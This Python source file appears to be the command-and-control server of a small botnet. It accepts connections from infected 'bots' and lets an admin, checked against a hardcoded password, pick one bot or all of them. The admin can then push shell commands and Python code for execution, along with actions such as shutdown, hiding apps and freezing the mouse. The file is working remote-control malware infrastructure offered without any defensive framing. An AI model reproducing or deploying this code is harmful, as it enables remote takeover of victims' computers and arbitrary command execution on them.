while True:
    try:
        import socket, threading, sockOp, json, struct

        sock = socket.socket()

        sock.bind(('', 9090))

        sock.listen(100)

        bots = {}

        admin = ''

        adminPass = "pass"

        mode = ''

        selectedBot = ""

        helplist = """
        cmd - exec commands
        ping - check bots
        message - message bot
        bot - choice bot
        python - exec python commands
        getuser - check user name
        mkdir 'name' - make dir on descktop
        install - install python package
        shutdown - power off bot
        descktop - hide all apps
        close - close app
        mouse - stop the mouse"""

        def sendBots(conn, data, sender):
            if selectedBot == "all":
                for i in bots:
                    try:
                        if bots[i] == "":
                            sendBack(conn, f"{i} ofline", "server")
                        else:
                            sendBack(bots[i], data['message'], sender)

                    except Exception as ert:
                        sendBack(conn, i, "server")
                        sendBack(conn, str(ert), "server")
            else:
                try:
                    if bots[selectedBot] == "":
                        sendBack(conn, "ofline", "server")
                    else:
                        sendBack(bots[selectedBot], data['message'], sender)
                        print("sent")

                except Exception as ert:
                    sendBack(conn, "Error", "server")
                    sendBack(conn, str(ert), "server")

        def botAction(conn, data):
            try:
                global admin
                sendBack(admin, data["message"], data["sender"])
            except:
                pass

        def administration(conn, data):
            global mode, selectedBot, helplist

            if data['message'] == "exit":
                sendBack(conn, "done", "server")
                mode = ''

            if data['message'] == "help":
                sendBack(conn, helplist, "server")

            print("Admin:", data['message'])
            if data['message'] == "bot":
                sendBack(conn, "enter the bot name", "server")
                sendBack(conn, "all", "server")
                for i in bots:
                    sendBack(conn, i, "server")
                mode = "select"

            elif mode == 'select':
                selectedBot = data['message']
                string = selectedBot + " selected"
                sendBack(conn, string, "server")
                mode = ""




            if data['message'] == "cmd":
                sendBack(conn, "enter the command's. To exit, enter 'exit'", "server")
                mode = "cmd"

            elif mode == "cmd":
                sendBots(conn, data, "cmd")

            if data['message'] == "python":
                sendBack(conn, "enter the py code. To exit, enter 'exit'", "server")
                mode = "python"

            elif mode == "python":
                sendBots(conn, data, "python")




        def sendBack(conn, message, sender):
            serverVerify = {
                "sender": sender,
                "message": message
            }
            sockOp.send_json(conn, serverVerify)

        def process(conn):

            global admin, bots
            status = "bot"

            message = sockOp.receive_json(conn)


            # autorisation

            if message["sender"] == "Admin":
                if message["pass"] == adminPass:
                    if admin == '':
                        admin = conn
                    status = "admin"
                else:
                    sendBack(conn, "wrong pass", 'server')
            elif (message["sender"] not in bots) or bots[message["sender"]] == '':
                bots[message["sender"]] = conn



            print(message)

            try:
                while True:
                    data_size = b''

                    while len(data_size) < 4:
                        data_size += conn.recv(4 - len(data_size))

                    size = struct.unpack("<I", data_size)[0]

                    data_size = b''

                    while len(data_size) < size:
                        data_size = conn.recv(size - len(data_size))

                    data = data_size.decode("utf-8")
                    print(data)
                    data = json.loads(data)
                    if (status == "admin"):
                        administration(conn, data)
                    else:
                        botAction(conn, data)
            except Exception as ex:
                print("disconnected")
                print(ex)
                if message["sender"] != "Admin":
                    del bots[message["sender"]]
                else:
                    admin = ''



        def debug():
            global bots, admin, mode, selectedBot
            while True:
                input()
                print("bots:", bots)
                print("admin:", admin)
                print("mode:", mode)
                print("selectedBot:", selectedBot)

        threading.Thread(target=debug).start()

        while True:

            conn, addr = sock.accept()
            threading.Thread(target=process, args=[conn]).start()
    except:
        pass